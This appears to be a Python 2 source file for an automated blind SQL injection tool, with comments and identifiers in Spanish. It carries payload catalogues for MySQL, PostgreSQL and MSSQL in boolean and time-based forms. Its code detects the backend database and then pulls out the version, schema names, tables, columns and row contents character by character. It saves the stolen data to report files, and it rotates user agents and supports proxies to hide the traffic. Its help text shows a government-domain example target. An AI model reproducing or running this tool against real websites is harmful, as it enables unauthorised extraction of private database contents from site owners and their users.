#!/usr/bin/env python
#coding:utf-8
import requests
from sys import argv, exit
from random import choice
from HTMLParser import HTMLParser
from getopt import getopt, GetoptError
from time import sleep
from datetime import datetime
import socks
import os
class Injection:
	Agentes={
	'Chrome':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
	'Google':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
	'iExplorer':'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
	'Firefox':'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
	'Safari':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
	'iPhone':'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16',
	'Android':'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
	}
	cabeceras={}
	proxy={}
	cookies = {}
	datos={}
	method = -1 # True = Get method # False = Post method
	server=""
	based=""
	sufijos = ['#','/*','//','-- a',';']
	Intentos={
		'mysql':[r"' or 4=4"] 
	}
	catalogoMySQL=["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	catalogo={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoMySQL={
		'version':["' and   ascii(substring(@@version,1,1))" , "'" , "and   ascii(substring(@@version," , "))" , "-- -+"],
		'bases':["lol" , "'" , "AND ascii(substring((SELECT schema_name FROM information_schema.schemata limit 1 offset " , "))" , "-- -+"],
		'current':["' and   ascii(substring(database(),1,1))" , "'" , "and   ascii(substring(database()," , "))" , "-- -+"],
		'tablas':["'" , " and   ascii(substring((SELECT table_name FROM information_schema.tables "  ,  "limit 1 offset "  ,"))" , "-- -+"],
		'columnas':["'" , " and   ascii(substring((SELECT column_name FROM information_schema.columns "  ,  "limit 1 offset "  ,"))" , "-- -+"],
		'datos':["'" , " and   ascii(substring((SELECT " , " FROM "  ,  "limit 1 offset "  ,"))" , "-- -+",")"]

	}		

	catalogoPostgres={
		'version':["' and   ascii(substring((select version()),1,1))" , "'" , "and   ascii(substring((select version())," , "))" , "-- -+"],
		'bases':["lol" , "'" , "AND ascii(substring((SELECT datname FROM pg_database limit 1 offset " , "))" , "-- -+"],
		'current':["' and   ascii(substring((SELECT current_database()),1,1))" , "'" , "and   ascii(substring((SELECT current_database())," , "))" , "-- -+"],
		'tablas':["'" , " and   ascii(substring((SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r''') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid) "  ,  "limit 1 offset "  ,"))" , "-- -+"],
		'columnas':["'" , " and   ascii(substring((SELECT A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') and relname = '"  ,  "limit 1 offset "  ,"))" , "-- -+"],
		'datos':["'" , " and   ascii(substring((cast((SELECT " , " FROM "  ,  "limit 1 offset "  ,"))" , "-- -+",") as varchar))"]
	}
	catalogoMSSQL={
		'version':["' and   ascii(substring(@@version,1,1))" , "'" , "and   ascii(substring(@@version," , "))" , "-- -+"],
		'bases':["lol" , "'" , "AND ascii(substring((SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS RowNo,name FROM master..sysdatabases offset) x WHERE x.RowNo = " , "))" , "-- -+"],
		'current':["' and   ascii(substring(database(),1,1))" , "'" , "and   ascii(substring((SELECT DB_NAME())," , "))" , "-- -+"],
		'tablas':["'" , " and   ascii(substring((SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS RowNo,name FROM "  ,  "..sysobjects offset WHERE xtype = 'U') x WHERE x.RowNo = "  ,"))" , "-- -+"],
		'columnas':["'" , " and   ascii(substring((SELECT COLUMN_NAME FROM (SELECT ROW_NUMBER() OVER (ORDER BY COLUMN_NAME ASC) AS RowNo,COLUMN_NAME FROM  "  ,  ") x WHERE x.RowNo = "  ,"))" , "-- -+"],
		'datos':["'" , " and   ascii(substring((SELECT CAST((SELECT " , " # FROM (SELECT ROW_NUMBER() OVER (ORDER BY $ ASC) AS RowNo,# FROM "  ,  " offset) x WHERE x.RowNo = "  ,"))" , "-- -+",") AS varchar))"]
	}
	catalogoOracle={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoMySQLBlind={
#		'version':["'and IF(ascii(substring((SELECT username from user where id = 1),1,1))>1,sleep(10),0)=0-- -+" , "'" , "and   IF(ascii(substring(@@version," , "))" , ",sleep(1),0)=0","-- -+"],
		'version':["LMAO" , "'" , "and   IF(ascii(substring(@@version," , "))" , ",sleep(0.5),0)=0","-- -+","",",sleep(0.5),0)=0"],
		'bases':["lol" , "'" , "AND IF(ascii(substring((SELECT schema_name FROM information_schema.schemata limit 1 offset " , "))" , ",sleep(0.5),0)=0","-- -+","",",sleep(0.5),0)=0"],
		'current':["' and   IF(ascii(substring(database(),1,1))" , "'" , "and   ascii(substring(database()," , "))" , ",sleep(0.5),0)=0-- -+","",",sleep(0.5),0)=0",",sleep(0.5),0)=0"],
		'tablas':["'" , " and   IF(ascii(substring((SELECT table_name FROM information_schema.tables "  ,  "limit 1 offset "  ,"))" , ",sleep(0.5),0)=0","-- -+",",sleep(0.5),0)=0",",sleep(0.5),0)=0"],
		'columnas':["'" , " and   IF(ascii(substring((SELECT column_name FROM information_schema.columns "  ,  "limit 1 offset "  ,"))" , ",sleep(0.5),0)=0","-- -+",",sleep(0.5),0)=0",",sleep(0.5),0)=0"],
		'datos':["'" , " and   IF(ascii(substring((SELECT " , " FROM "  ,  "limit 1 offset "  ,"))" , ",sleep(0.5),0)=0",")",",sleep(0.5),0)=0"]

	}		

	catalogoPostgresBlind={
		'version':["lol 1" , "';" , "select case when(ascii(substring((select version())," , "))" , "-- -+", "", "", ") then pg_sleep(1) ELSE 'E' END"],
		'bases':["lol" , "';" , "select case when(ascii(substring((SELECT datname FROM pg_database limit 1 offset " , "))" , "-- -+","","",") then pg_sleep(1) ELSE 'E' END"],
		'current':["' select case when(ascii(substring((SELECT current_database()),1,1))" , "';" , "select case when(ascii(substring((SELECT current_database())," , "))" , "-- -+","","",") then pg_sleep(1) ELSE 'E' END"],
		'tablas':["';" , " select case when(ascii(substring((SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r''') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid) "  ,  "limit 1 offset "  ,"))" , "-- -+","","",") then pg_sleep(1) ELSE 'E' END"],
		'columnas':["';" , " select case when(ascii(substring((SELECT A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') and relname = '"  ,  "limit 1 offset "  ,"))" , "-- -+","","",") then pg_sleep(1) ELSE 'E' END"],
		'datos':["';" , " select case when(ascii(substring((cast((SELECT " , " FROM "  ,  "limit 1 offset "  ,"))" , "-- -+",") as varchar))",") then pg_sleep(1) ELSE 'E' END"]
	}
	catalogoMSSQLBlind={
		'version':["' and   ascii(substring(@@version,1,1))" , "'" , "and   ascii(substring(@@version," , "))" , "-- -+"],
		'bases':["lol" , "'" , "AND ascii(substring((SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS RowNo,name FROM master..sysdatabases offset) x WHERE x.RowNo = " , "))" , "-- -+"],
		'current':["' and   ascii(substring(database(),1,1))" , "'" , "and   ascii(substring((SELECT DB_NAME())," , "))" , "-- -+"],
		'tablas':["'" , " and   ascii(substring((SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS RowNo,name FROM "  ,  "..sysobjects offset WHERE xtype = 'U') x WHERE x.RowNo = "  ,"))" , "-- -+"],
		'columnas':["'" , " and   ascii(substring((SELECT COLUMN_NAME FROM (SELECT ROW_NUMBER() OVER (ORDER BY COLUMN_NAME ASC) AS RowNo,COLUMN_NAME FROM  "  ,  ") x WHERE x.RowNo = "  ,"))" , "-- -+"],
		'datos':["'" , " and   ascii(substring((SELECT CAST((SELECT " , " # FROM (SELECT ROW_NUMBER() OVER (ORDER BY $ ASC) AS RowNo,# FROM "  ,  " offset) x WHERE x.RowNo = "  ,"))" , "-- -+",") AS varchar))"]
	}
	catalogoOracleBlind={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	notautos=['and 1=0-- -+']
	SentHeaders = ""
	respuesta = ""

	def __init__(self):
		self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})

	def setAgent(self,agent=""):
		if agent:
			self.cabeceras.update({'User-Agent':agent})
		else:
			self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})

	def setServer(self,server):
		self.server = server

	def setCookie(self,galleta):
		#self.cookie.update({""})
		print galleta

	def setBased(self,based):
		#self.cookie.update({""})
		self.based = based

	def setData(self,datosPagina):
		datosPagina = datosPagina.split('&')
		for parameter in datosPagina:
			self.datos.update({parameter.split('=')[0]:parameter.split('=')[1]})

	def setMethod(self,metodo):
		if metodo == 'get':
			self.method = True
		elif metodo == 'post':
			self.method = False
		else:
			print "Method not implemented"
	def setProxy(self,proxy):
		if proxy.split("://")[0] in ["http","ftp","https"]:
			self.proxy = {proxy.split("://")[0]:proxy.split("://")[1]}
		else:
			self.proxy = self.proxy = {"http":proxy}
	@staticmethod
	def busqueda(obj,manejador,tipo,ok,up,down,fila,columna,where,based):
		
		
		caracter = chr(Injection.getMid(up,down))
		#print "up: ",up," car: ",ord(caracter)," down:",down
		if tipo == "version" and based == "error":
			coord = str(fila)+","+str(columna)
			direccion = obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]
		elif tipo == "bases"  and based == "error":
			coord = str(columna)+"),"+str(fila)+",1"
			direccion = obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]
		elif tipo == "current"  and based == "error":
			coord = str(fila)+","+str(columna)
			direccion = obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]
		elif tipo == "tablas"  and based == "error":
			coord = "," + str(fila)+",1"
			direccion = obj.server+manejador[tipo][0]+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]
			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
		elif tipo == "columnas"  and based == "error":
			coord = "," + str(fila)+",1"
			direccion = obj.server+manejador[tipo][0]+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]
			print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
		elif tipo == "datos"  and based == "error":
			coord = "," + str(fila)+",1"
			direccion = obj.server+manejador[tipo][0]+manejador[tipo][1]+where+manejador[tipo][3]+str(columna)+manejador[tipo][6]+coord+manejador[tipo][4]
			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"

		elif tipo == "version" and based == "time":
			coord = str(fila)+","+str(columna)
			direccion = obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]
			#print direccion
			#+">"+str(ord(caracter))+"-- -+"
		elif tipo == "bases"  and based == "time":
			coord = str(columna)+"),"+str(fila)+",1"
			direccion = obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]
		elif tipo == "current"  and based == "time":
			coord = str(fila)+","+str(columna)
			direccion = obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]
		elif tipo == "tablas"  and based == "time":
			coord = "," + str(fila)+",1"
			direccion = obj.server+manejador[tipo][0]+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]
			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
		elif tipo == "columnas"  and based == "time":
			coord = "," + str(fila)+",1"
			direccion = obj.server+manejador[tipo][0]+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]
			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
		elif tipo == "datos"  and based == "time":
			coord = "," + str(fila)+",1"
			direccion = obj.server+manejador[tipo][0]+manejador[tipo][1]+where+manejador[tipo][3]+str(columna)+manejador[tipo][6]+coord+manejador[tipo][4]

		#print "Coordenada: "+coord
		#print " Consulta 2:"+obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+"
		# consulta = requests.get(url=direccion+"=NULL-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
		# if consulta.text == ok:
		# 	return ""
		if based == "error":
			consulta = requests.get(url=direccion+"="+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
			if consulta.text == ok:
				return caracter
			elif (consulta.text != ok) and (up == down ):
				return "No encontrado"
			else:
				

				consulta2 = requests.get(url=direccion+">"+str(ord(caracter))+manejador[tipo][7]+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)

					
				if consulta2.text == ok:
					#print "iguales"
					#print "up: ",up," down(car): ",ord(caracter)
					#print ""
					return Injection.busqueda(obj,manejador,tipo,ok,up,ord(caracter),fila,columna,where,obj.based)
				else:
					#print "up(car): ",ord(caracter)," down:",down
					#print ""
					down2=down
					if (down2 + 1) == ord(caracter):
						return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter)-1,down,fila,columna,where,obj.based)
					return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter),down,fila,columna,where,obj.based)


		elif based == "time":
			consulta = requests.get(url=direccion+"="+str(ord(caracter))+manejador[tipo][7]+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
			#print consulta.elapsed.seconds
			#print "\n\n\n "+direccion+"="+str(ord(caracter))+manejador[tipo][7]+"-- -+"
			#print "Consulta.text=("+consulta.text+") elapsed:"+str(consulta.elapsed.seconds)+" up y down"+str(up)+"   "+str(down)
			if consulta.text == ok and consulta.elapsed.seconds == 1:
				return caracter

				
			elif consulta.elapsed.seconds == 0 and (up == down ):
				return "No encontrado"
			else:
				

				consulta2 = requests.get(url=direccion+">"+str(ord(caracter))+manejador[tipo][7]+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				#print "\n"+direccion+">"+str(ord(caracter))+manejador[tipo][7]+"-- -+"
				#print "else Consulta.text=("+consulta2.text+") elapsed:"+str(consulta2.elapsed.seconds)
					
				if consulta2.text == ok and consulta2.elapsed.seconds == 1:
					#print "iguales"
					#print "up: ",up," down(car): ",ord(caracter)
					#print ""
					return Injection.busqueda(obj,manejador,tipo,ok,up,ord(caracter),fila,columna,where,obj.based)
				else:
					#print "up(car): ",ord(caracter)," down:",down
					#print ""
					down2=down
					if (down2 + 1) == ord(caracter):
						return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter)-1,down,fila,columna,where,obj.based)
						#print consulta.elapsed.seconds
					return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter),down,fila,columna,where,obj.based)
	
	@staticmethod
	def getDatos(obj,manejador,ok,tipo):
		char = ""
		indiceY = 1
###=========Version============= 
		version = ""
		while char != "No encontrado":
			char =obj.busqueda(obj,manejador,"version",ok,126,32,indiceY,1,"",obj.based)
			#print "Caracter: "+char
			if char != "No encontrado":
				version += char
				indiceY = indiceY +1
		print "Version: "+version
###=========Bases===============
		print "Bases:"
		indiceY	= 1
		indiceX = 0
		if tipo == "mssql":
			indiceX = 1
		bandera = 0
		base = ""
		bases = {}
		while char == "No encontrado" and bandera != 1:
			char = ""
			while char != "No encontrado":
				
				char =obj.busqueda(obj,manejador,"bases",ok,126,32,indiceY,indiceX,"",obj.based)
				#print "Caracter: "+char
				if char != "No encontrado":
					base += char
					indiceY = indiceY +1
			bases[base] = [""]
			print "BASE: "+base
			base = ""
			indiceX = indiceX + 1
			bandera = indiceY
			indiceY = 1
###=========Current============= 

		current = ""
		char = ""
		while char != "No encontrado":
			char =obj.busqueda(obj,manejador,"current",ok,126,32,indiceY,1,"",obj.based)
			#print "Caracter: "+char
			if char != "No encontrado":
				current += char
				indiceY = indiceY +1

# ##==========Tablas============
		print "Tablas:"
		indiceY	= 1
		indiceX = 0
		if tipo == "mssql":
			indiceX = 1
		bandera = 0
		tabla = ""
		if tipo == "mysql" or tipo == "mssql":
			for where in bases.keys():
				bandera = 0
				indiceY	= 1
				indiceX = 0					
				if tipo == "mysql":
					condicion = "WHERE table_schema = '"+where+"'"
				elif tipo == "pgsql":
					condicion = ""
				elif tipo == "mssql":
					condicion = where
					indiceX = 1
				#print "WHERE: "+ condicion+ "char: "+ char + "bandera: ",bandera
				while char == "No encontrado" and bandera != 1:
					char = ""
					#print "lol"
					while char != "No encontrado":
						
						char =obj.busqueda(obj,manejador,"tablas",ok,126,32,indiceY,indiceX,condicion,obj.based)
						#print "Caracter: "+char
						if char != "No encontrado":
							tabla += char
							indiceY = indiceY +1
					bases[where].append(tabla)
					print "TABLA: "+tabla
					tabla = ""
					indiceX = indiceX + 1
					bandera = indiceY
					indiceY = 1
		if tipo == "pgsql":
				where = current
				bandera = 0
				indiceY	= 1
				indiceX = 0
				if tipo == "mysql":
					condicion = "WHERE table_schema = '"+where+"'"
				elif tipo == "pgsql":
					condicion = ""
				print "WHERE: "+ condicion+ "char: "+ char + "bandera: ",bandera
				while char == "No encontrado" and bandera != 1:
					char = ""
					#print "lol"
					while char != "No encontrado":
						
						char =obj.busqueda(obj,manejador,"tablas",ok,126,32,indiceY,indiceX,condicion,obj.based)
						#print "Caracter: "+char
						if char != "No encontrado":
							tabla += char
							indiceY = indiceY +1
					bases[where].append(tabla)
					print "TABLA: "+tabla
					tabla = ""
					indiceX = indiceX + 1
					bandera = indiceY
					indiceY = 1
		
		
		
		#f.close()
		#print bases[:len(bases)-1]
		

####============Datos============
		print "Datos:"
		indiceY	= 1
		indiceX = 0
		bandera = 0
		if tipo == "mssql":
			indiceX = 1
		tabla = ""
		if not os.path.exists("report"):
			os.makedirs("report")
		Filename = "report/datos"+str(datetime.now())+"--"+tipo
		f = open(Filename+".txt",'w');
		f.write("Blind "+obj.based+" based")
		f.write("\nBases de datos: \n")
		for where in bases.keys():
			f.write("\n"+where+"\n")
			for tablas in bases[where]:
				f.write(" "+tablas)
		if tipo == "pgsql":
			bases2 = {}
			bases2[current]=bases[current]
			bases = {}
			bases[current]=bases2[current]

		f.write("\nCurrent Database: "+current+"\n")
		f.write("Version: "+version+"\n")
		#f.write(bases)
		f.write("\n")

		for where in bases.keys():
			tablaCol=['']
			if where != "information_schema" and where != "mysql" and where != "performance_schema" and where != "msdb" and where != "master"  and where != '':
				for table in bases[where]:
		#			columnas = 0
		#			consulta3 = requests.get(url=self.server+"' and substring((select count(*) from information_schema.columns where table_name ='"+table+"' and table_schema = '"+where+"'),1,1)=0 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
		#			while consulta3.text  != pagina.text:
		#				columna = columna +1
		#				consulta3 = requests.get(url=self.server+"' and substring((select count(*) from information_schema.columns where table_name ='"+table+"' and table_schema = '"+where+"'),1,1)="+columna+"-- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
					#print "lol de control 1"+table+where
					bandera = 0
					indiceY	= 1
					indiceX = 0
					columna1 = ""
					banderaCol = 0
					if tipo == "mssql":
						indiceX = 1
					columna = ""	
					if tipo == "mysql":
						condicion = "WHERE table_schema = '"+where+"' and table_name = '"+table+"'"
					elif tipo == "pgsql":
						condicion = table+"'"
					elif tipo == "mssql":
						condicion = where+".INFORMATION_SCHEMA.COLUMNS  offset WHERE TABLE_NAME=N'"+table+"'"
						#print "lol de control 2 "+table+" - "+where
					#print "WHERE: "+ condicion+ "char: "+ char + "bandera: ",bandera
					while char == "No encontrado" and bandera != 1:
						char = ""
						#print "lol"
						while char != "No encontrado":
							
							char =obj.busqueda(obj,manejador,"columnas",ok,126,32,indiceY,indiceX,condicion,obj.based)
							#print "lol de control 2 "+table+" - "+where + " c " + char
							#print "Caracter: "+char
							if char != "No encontrado":
								columna += char
								indiceY = indiceY +1
						tablaCol.append(columna)
						if banderaCol == 0:
							columna1 = columna
							banderaCol = 1
						if where != '' and table != '' and columna != '':

							print "\n\nBase: "+where+" Tabla:"+table+" columnas: "+columna
							f.write("Base: "+where+" Tabla:"+table+" columnas: "+columna+"\n");
							char2 = "No encontrado"
							bandera2 = 0
							indiceY2	= 1
							indiceX2 = 0
							if tipo == "mssql":
								indiceX2 = 1
							limite = 0
							count = requests.get(url=obj.server+"' and 1=2-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
							pagCont = requests.get(url=obj.server+"' and 1=1-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
							
							#print count.text
							#print pagCont.text
							if tipo == "mysql" and obj.based == "error":
								while count.text != pagCont.text:
									count = requests.get(url=obj.server+"' and (select count(*) from "+where+"."+table+")="+str(limite)+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
									#print obj.server+"' and (select count(*) from "+where+"."+table+")="+str(limite)+"-- -+"
									limite = limite +1

							elif tipo == "pgsql" and obj.based == "error":
								while count.text != pagCont.text:
									count = requests.get(url=obj.server+"' and (select count(*) from "+table+")="+str(limite)+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
									limite = limite +1
							elif tipo == "mssql" and obj.based == "error":
								while count.text != pagCont.text:
									count = requests.get(url=obj.server+"' and (select count(*) from "+where+".."+table+")="+str(limite)+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
									limite = limite +1

							elif tipo == "mysql" and obj.based == "time":
								while count.text != pagCont.text:
									count = requests.get(url=obj.server+"' and (select count(*) from "+where+"."+table+")="+str(limite)+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
									#print obj.server+"' and (select count(*) from "+where+"."+table+")="+str(limite)+"-- -+"
									limite = limite +1

							elif tipo == "pgsql" and obj.based == "time":
								while count.text != pagCont.text:
									count = requests.get(url=obj.server+"' and (select count(*) from "+table+")="+str(limite)+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
									limite = limite +1
							elif tipo == "mssql" and obj.based == "time":
								while count.text != pagCont.text:
									count = requests.get(url=obj.server+"' and (select count(*) from "+where+".."+table+")="+str(limite)+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
									limite = limite +1

							limite2 = 0
							while limite2 != limite-1:
								#print "\nLimite:"+str(limite)+"    Limite2 :"+str(limite2)
								char2 = ""
								dato = ""
								#print "lol"
								
								

								while char2 != "No encontrado":
									if tipo == "mysql":
										condicion2 = columna + " from " + where + "." + table + " "
									elif tipo == "pgsql":
										condicion2 = columna + " from " + table + " "
									elif tipo == "mssql":
										condicion2 = manejador["datos"][2].replace("#",columna).replace("$",columna1)+where+".."+table
									char2 =obj.busqueda(obj,manejador,"datos",ok,126,32,indiceY2,indiceX2,condicion2,obj.based)
									#print "Caracter: "+char2
									if char2 != "No encontrado":
										dato += char2
										indiceY2 = indiceY2 +1
										#print "Char2: "+char2+" columna: "+columna+" Base: "+where

								#bases[where].append(tabla)
								#print "==============================\nChar2: "+char2+" columna: "+columna+" Base: "+where+" Dato: "+dato+"=========================\n"								
								f.write(dato+"\n")
								#print "TABLA: "+tabla
								dato = ""
								indiceX2 = indiceX2 + 1
								bandera2 = indiceY2
								indiceY2 = 1
								limite2 = limite2 +1





						
						columna = ""
						indiceX = indiceX + 1
						bandera = indiceY
						indiceY = 1






##======================== Resultados
		print "\nCurrent Database: "+current
		print "Version: "+version
		#print bases[:len(bases)-1]
		print bases
		f.close()
		
			
	@staticmethod
	def getMid(up,down):
		return int(((up-down)/2) + down)

	@staticmethod
	def getCatalog(obj,version):
		if version == "mysql" and obj.based == "error":
			return obj.catalogoMySQL
		elif version == "pgsql" and obj.based == "error":
			return obj.catalogoPostgres
		elif version == "mssql" and obj.based == "error":
			return obj.catalogoMSSQL
		elif version == "oracle" and obj.based == "error":
			return obj.catalogoOracle
		elif version == "mysql" and obj.based == "time":
			return obj.catalogoMySQLBlind
		elif version == "pgsql" and obj.based == "time":
			return obj.catalogoPostgresBlind
		elif version == "mssql" and obj.based == "time":
			return obj.catalogoMSSQLBlind
		elif version == "oracle" and obj.based == "time":
			return obj.catalogoOracleBlind



	def Begin(self):
		#print self.server, self.cabeceras
		print "Starting Attack\n\n\n"
		sleep(1)
		if self.method:#GET
			pagina = requests.get(url=self.server,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
			print "pagina "+pagina.text
			for tauto in self.notautos:
				print "Query ",tauto
				tautosidad = requests.get(url=self.server+"' and 1=0 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
				tautosidad2 = requests.get(url=self.server+"' and 1=1 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
				#print tautosidad.text
				#print tautosidad2.text
				if (tautosidad.text != pagina.text and tautosidad2.text == pagina.text):
					PGSQLoMySQL = requests.get(url=self.server+"' union select @@version -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
#					print "!",PGSQLoMySQL.text," !! ",pagina.text
					if PGSQLoMySQL.text == pagina.text:
						MSSQLoMySQL = requests.get(url=self.server+"' and True -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
						if MSSQLoMySQL.text == pagina.text:
							database = "mysql"
							print "Base de datos detectada: ",database
							

						else:
							database = "mssql"
							print "Base de datos detectada: ",database
					else:
#						select tablename from pg_tables;
						database = "pgsql"
						print "Base de datos detectada: ",database

					self.getDatos(self,self.getCatalog(self,database),pagina.text,database)

					# for query in self.catalogo.get(database):		
					# 	ciego = requests.get(url=self.server+query,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
				
					# 	if ciego == pagina:
					# 		print query + " ! " + ciego.text + " ! iguales"					
					# 	else:
					# 		print query + " ! " + ciego.text + " ! no iguales"
				else:
					print "Página no vulnerable"
		else:#POST
			pagina = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=self.datos,proxies=self.proxy)
		self.SentHeaders = pagina.request.headers
		self.solicitud = pagina.request.headers
		self.respuesta = pagina.content.lower()
		print "{0} {1} {2}".format(pagina.request.method,pagina.request.path_url,"HTTP/1.1")
		for cabecera in self.solicitud:
			print "{0}:{1}".format(cabecera,self.solicitud.get(cabecera))
#		print self.solicitud
#		print pagina.text


def Opciones(argv):
	try:
		opciones, argumentos = getopt(argv[1:],"h:v",["request=","user-agent=","method=","random-agent=","data=","proxy=","based="])
	except GetoptError:
		print """### Ayuda ###\n{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>""".format(argv[0])
		exit(2)
	for opt, vals in opciones:
		#Ayuda
		if opt in ('-h','--help'):
			print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
		#Server
		elif opt in ('--request'):
			#print "{0} -> {1}".format(opt,vals)
			inject.setServer(vals)
		#User-Agent
		elif opt in ('--user-agent'):
			inject.setAgent(vals)
			#print "{0} -> {1}".format(opt,vals)
		elif opt in ('--cookie'):
			inject.setCookie(vals)
		elif opt in ('--data'):
			inject.setData(vals)
		#User-Agent Random NO FUNCIONA AUN
		elif opt == '--random-agent':
			inject.setAgent("")
		elif opt == '--proxy':
			inject.setProxy(vals)
		elif opt == '--based':
			inject.setBased(vals)
		#Option not valid
		elif opt == '--method':
			if vals in ('get','post'):
				inject.setMethod(vals)
			else:
				print "Method not implemented"
		else:
			print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
			exit(1)
	else:
		main()



def main():
	inject.Begin()

	# Response = str(requests.get(server,headers=cabeceras).text).lower()
	# posIni = Response.find('post')
	# posFin = Response.find('</form>',posIni)
	# parametros = Response[posIni:posFin]
	# datos = parametros[parametros.find('<table'):] 
	# print datos
if __name__ == "__main__":
	inject = Injection()
	Opciones(argv)
	#main()



